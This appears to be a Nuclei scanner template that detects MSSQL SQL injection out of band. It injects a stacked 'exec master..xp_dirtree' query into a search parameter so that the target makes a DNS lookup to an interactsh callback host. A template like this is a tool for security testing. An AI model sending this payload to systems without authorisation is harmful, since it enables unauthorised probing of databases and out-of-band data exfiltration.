http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}/?search=1; exec master..xp_dirtree ''\\{{interactsh-url}}\abc''--'
  stop-at-first-match: true
id: ai-mssql-oob-dns
info:
  author: openai
  name: MSSQL xp_dirtree DNS OOB
  severity: high
  tags: sqli,oob,mssql
